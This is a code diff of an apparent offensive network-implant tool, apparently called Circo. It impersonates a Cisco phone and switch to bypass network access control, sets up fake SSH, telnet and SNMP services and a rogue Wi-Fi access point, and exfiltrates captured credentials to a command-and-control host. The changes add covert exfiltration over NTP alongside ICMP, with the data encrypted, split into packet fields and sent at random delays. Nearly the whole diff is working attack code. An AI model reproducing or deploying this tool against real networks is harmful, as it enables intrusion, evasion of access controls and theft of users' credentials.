-    cdpdh.daemon = True
-    cdpdh.start()
-    # Stop calling .join() after X seconds (default 60sec)
-    if DEBUG:
-        print('CDPd started - phone')
-        time.sleep(10)
-        print('CDPd stoped (60sec) - phone (verbose 10sec)')
-    else:
-        time.sleep(60)
-    cdpdh.join()
+    if options.nic:
+        # Pretend to be a phone to bypass NAC, tune the amount of time you want
+        cdpdh = CDPHandler(iface, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1', False)
+        cdpdh.daemon = True
+        cdpdh.start()
+        # Stop calling .join() after X seconds (default 60sec)
+        if DEBUG:
+            print('CDPd started - phone')
+            time.sleep(10)
+            print('CDPd stoped (60sec) - phone (verbose 10sec)')
+        else:
+            time.sleep(60)
+        cdpdh.join()
 
-    # Fake LLDP for phone
-    lldpdh = LLDPHandler(iface, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1', False)
-    lldpdh.daemon = True
-    lldpdh.start()
-    # Stop calling .join() after X seconds (default 60sec)
-    if DEBUG:
-        print('LLDP started - phone')
-        time.sleep(10)
-        print('LLDPd stoped (60sec) - phone (verbose 10sec)')
-    else:
-        time.sleep(60)
-    lldpdh.join()
+        # Fake LLDP for phone
+        lldpdh = LLDPHandler(iface, phonemac, ip, 'SEP' + phonemac.replace(':', ''), 'Port 1', False)
+        lldpdh.daemon = True
+        lldpdh.start()
+        # Stop calling .join() after X seconds (default 60sec)
+        if DEBUG:
+            print('LLDP started - phone')
+            time.sleep(10)
+            print('LLDPd stoped (60sec) - phone (verbose 10sec)')
+        else:
+            time.sleep(60)
+        lldpdh.join()
 
     if EPRX:
         prxlist = []
         if DEBUG:
             print('Proxy Discovery started')
         # Discover WPAD via DHCP Inform (Option 252) if not already via initial DHCP Reply
-	if not wpad:
-		dhinform = DHCPInformHandler(iface, xid)
-		dhinform.daemon = True
-		dhinform.start()
-		dhcpinform = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
-				IP(src=ip, dst="255.255.255.255") /
-				UDP(sport=68, dport=67) /
-				BOOTP(chaddr=chaddr, ciaddr=ip, xid=xid) /
-				DHCP(options=[('message-type', 'inform'), ('param_req_list', 252), 'end'])
-				)
-		sendp(dhcpinform, iface=iface, verbose=0)
-		time.sleep(10)
-		wpad = dhinform.join()
+        if not wpad:
+            dhinform = DHCPInformHandler(iface, xid)
+            dhinform.daemon = True
+            dhinform.start()
+            dhcpinform = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+                    IP(src=ip, dst="255.255.255.255") /
+                    UDP(sport=68, dport=67) /
+                    BOOTP(chaddr=chaddr, ciaddr=ip, xid=xid) /
+                    DHCP(options=[('message-type', 'inform'), ('param_req_list', 252), 'end'])
+                    )
+            sendp(dhcpinform, iface=iface, verbose=0)
+            time.sleep(10)
+            wpad = dhinform.join()
         # No option 252, look for WPAD DNS entry
         if not wpad:
             if DEBUG:
@@ -812,26 +1050,29 @@ def main():
                         print('Found DNS, looking for PAC files')
                     for rr in range(len(answer)):
                         if DEBUG:
-                            print(master_list[prx] + '.' + domain + '=' + answer[rr])
+                            print(master_list[prx] + '.' + domain + ' = ' + str(answer[rr]))
                         prxlist = getpac(str(answer[rr]), False)
                         if prxlist:
                             break
         if DEBUG:
             print('Proxy Discovery ended')
 
-    # Wait 300sec or more to clear MAC (180sec to clear CDP)
-    if DEBUG:
-        time.sleep(10)
-        print('Wait 300sec for MAC & CDP cache to clear (verbose 10sec)')
-    else:
-        time.sleep(300)
-
-    # Change MAC to became a Cisco Switch
-    if DEBUG:
-        print('MAC change started - switch')
-    changemac(iface, switchmac)
-    if DEBUG:
-        print('MAC change ended - switch')
+    if options.nic:
+        # Wait 300sec or more to clear MAC (180sec to clear CDP)
+        if DEBUG:
+            time.sleep(10)
+            print('Wait 300sec for MAC & CDP cache to clear (verbose 10sec)')
+        else:
+            time.sleep(300)
+        # Change MAC to became a Cisco Switch (add default gateway again)
+        if DEBUG:
+            print('MAC change started - switch')
+        changemac(iface, switchmac)
+        FNULL = open(os.devnull, 'w')
+        subprocess.call(["route", "add", "default", "gw", gwip],
+                        stdout=FNULL, stderr=subprocess.STDOUT)
+        if DEBUG:
+            print('MAC change ended - switch')
 
     # Search CDP packets from discover()
     find = re.compile('[<CDPNAME>|<LLDPNAME>],(.*)')
@@ -846,8 +1087,7 @@ def main():
         print('Hostname setup - switch')
 
     # Start fake CDP as 'switch'
-    cdppkt = rdpcap(swcdptpl, 1)
-    cdpdh = CDPHandler(iface, cdppkt, switchmac, ip, fakeswname, switchport)
+    cdpdh = CDPHandler(iface, switchmac, ip, fakeswname, switchport, True)
     cdpdh.daemon = True
     cdpdh.start()
     if DEBUG:
@@ -858,13 +1098,20 @@ def main():
     lldpdh.daemon = True
     lldpdh.start()
     if DEBUG:
-        print('LLDP started - phone')
+        print('LLDP started - switch')
 
     # Create SNMP config for snmposter daemon
     ipnet = str(ipcalc.Network(ip + '/' + netmask).network())
     snmpconf(fakeswname, ip, netmask, ipnet, mac, gwip, gwmac)
     if DEBUG:
         print('SNMP config created')
+
+    # Kill nmap-fooler process if running and start them
+    kill_process('nmap-fooler')
+    if DEBUG:
+        print('NMAP fooler started')
+    nmap = dirname + 'nmap-fooler.py ' + iface
+    subprocess.call(nmap + ' &', shell=True)
 
     # Start snmposter daemon
     kill_process('snmposter')
@@ -875,6 +1122,25 @@ def main():
     snmpdh.start()
     if DEBUG:
         print('SNMP catcher started')
+
+    # Telnet Banner Grab
+    if DEBUG:
+        print('Telnet Grab started')
+    listip = [gwip]
+    cdpip = grepline(clifd, '<CDPIP>')
+    lldpip = grepline(clifd, '<LLDPIP>')
+    if cdpip:
+        listip.append(cdpip.split(',')[1].strip())
+    if lldpip:
+        listip.append(lldpip.split(',')[1].strip())
+    banner = telnetgrab(list(set(listip)))
+    if banner:
+        motd = re.sub('(\r\n\r\n\r\nUser Access Verification\r\n\r\n)|([uU]sername: )|([pP]assword: )|([lL]ogin: )', '', banner)
+        motd = motd.replace('\r\n', '<CR>')
+    else:
+        motd = ''
+    if DEBUG:
+        print('Telnet Grab ended')
 
     # Create config file for telnet & ssh fake daemons
     with open(clifd, 'a') as cli:
@@ -897,6 +1163,7 @@ def main():
         cli.write('<SNPSU>,' + snpsu + '\n')
         # Future use in Circo v2
         cli.write('<SNMPC>,' + snmpcommunity + '\n')
+        cli.write('<MOTD>,' + motd + '\n')
     if DEBUG:
         print('CLI config created')
 
@@ -917,18 +1184,37 @@ def main():
     if EAP:
         if DEBUG:
             print('WIFI monitor started')
-        subprocess.call('/sbin/ifconfig ' + wiface + ' down', shell=True)
-        subprocess.call('/usr/sbin/airmon-ng start '
-                        + wiface + ' 10 >/dev/null', shell=True)
-        wiface = wiface + 'mon'
-        subprocess.call('/sbin/ifconfig ' + wiface + ' up', shell=True)
+        subprocess.call('sudo ip link set ' + wiface + ' down', shell=True)
+        time.sleep(0.3)
+        subprocess.call('sudo iw ' + wiface + ' set monitor control', shell=True)
+        time.sleep(0.3)
+        subprocess.call('sudo ip link set ' + wiface + ' up', shell=True)
+        time.sleep(0.3)
+        subprocess.call('sudo iw ' + wiface + ' set channel ' + WIFICHANNEL, shell=True)
 
         # Start Fake AP
-        aphd = APHandler(wiface, mastercred, 5)
+        aphd = APHandler(wiface, mastercred, 2)
         aphd.daemon = True
         aphd.start()
         if DEBUG:
             print('AP started')
+
+    # Start case alarm
+    if EPRX:
+        if prxlist:
+            prxlt = prxlist
+        else:
+            prxlt = False
+    else:
+        prxlt = False
+    if EAP:
+        alarmdh = AlarmHandler(switchmac, gwmac, ip, iface, wiface, dns_srv, prxlt)
+    else:
+        alarmdh = AlarmHandler(switchmac, gwmac, ip, iface, None, dns_srv, prxlt)
+    alarmdh.daemon = True
+    alarmdh.start()
+    if DEBUG:
+        print('Case alarm started')
 
     # Main Loop if credentials found
     while True:
@@ -937,11 +1223,15 @@ def main():
                 with open(mastercred, 'r') as sfile:
                     for line in sfile:
                         # encrypt and split into 4 bytes
-                        cry = encrypti(line.strip())
+                        cry = encrypt(line.strip())
                         ar = [cry[i:i+4] for i in range(0, len(cry), 4)]
+                        ar8 = [cry[i:i+8] for i in range(0, len(cry), 8)]
                         if len(cry) % 4 != 0:
                             for x in range(4-len(ar[len(ar)-1])):
                                 ar[len(ar)-1] = ar[len(ar)-1] + '0'
+                        if len(cry) % 8 != 0:
+                            for x in range(8-len(ar8[len(ar8)-1])):
+                                ar8[len(ar8)-1] = ar8[len(ar8)-1] + '0'
 
                         # ICMP exfiltration
                         # Use [IP].id 200+len of crypto (first pkt)
@@ -954,12 +1244,18 @@ def main():
                             # craft packet
                             pingpkt = (Ether(src=switchmac, dst=gwmac) /
                                        IP(ihl=5, src=ip, dst=cchost)/ICMP() /
-                                       Raw(load='s\x88\xb7[\x7f\xc2\x05\x00'
-                                                '\x08\t\n\x0b\x0c\r\x0e\x0f'
-                                                '\x10\x11\x12\x13\x14\x15\x16'
-                                                '\x17\x18\x19\x1a\x1b\x1c\x1d'
-                                                '\x1e\x1f !"#$%&\'()*+,-./012'
-                                                '34567'))
+                                       Raw(load='\x00\x00\x00\x00\x18\x83'
+                                                '\xedt\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd\xab'
+                                                '\xcd\xab\xcd\xab\xcd'))
 
                             # first pkt (crypto len)
                             pingpkt[IP].id = 200 + len(cry)
@@ -1245,6 +1541,42 @@ def main():
                                         time.sleep(random.randint(1, 30))
                                     else:
                                         time.sleep(1)
+                        if ENTP:
+                            if DEBUG:
+                                print('Sending credentials via NTP')
+                            # first pkt
+                            # Stratum = 16
+                            # Poll = len total_seq
+                            # Precision = len crypto
+                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
+                            s.bind((ip, 123))
+                            s.connect((cchost, 123))
+                            timenow = datetime.utcnow() - datetime(1900, 1, 1, 0, 0, 0)
+                            ntptime = format(int(timenow.total_seconds()), 'x').decode('hex')
+                            ntppkt = '\xe3\x10' + chr(len(ar8)) + chr(len(cry)) + '\0\x01\0\0\0\x01' + 30 * '\0' + ntptime + 4 * '\0'
+                            s.send(ntppkt)
+
+                            # random delay
+                            if DEBUG:
+                                time.sleep(1)
+                            else:
+                                time.sleep(random.randint(1, 30))
+
+                            # paylod pkts
+                            # Stratum = 0
+                            # Poll = seq #
+                            # Transmit Timestamp  = <timestamp>.<crypto> 4 bytes
+                            for x in range(len(ar8)):
+                                timenow = datetime.utcnow() - datetime(1900, 1, 1, 0, 0, 0)
+                                ntptime = format(int(timenow.total_seconds()), 'x').decode('hex')
+                                ntppkt = '\xe3\0' + chr(x+1) + '\xfa' + '\0\x01\0\0\0\x01' + 30 * '\0' + ntptime + ar8[x].decode('hex')
+                                s.send(ntppkt)
+                                # random delay
+                                if DEBUG:
+                                    time.sleep(1)
+                                else:
+                                    time.sleep(random.randint(1, 30))
+                            s.close()
 
                 # Define interval between exfiltration (per line of cred file)
                 if DEBUG:
@@ -1258,8 +1590,10 @@ def main():
             kill_process('sshd-fake')
             kill_process('telnetd-fake')
             kill_process('snmposter')
+            kill_process('nmap')
             cdpdh.join()
             lldpdh.join()
+            alarmdh.join()
             try:
                 aphd.join()
             except NameError:
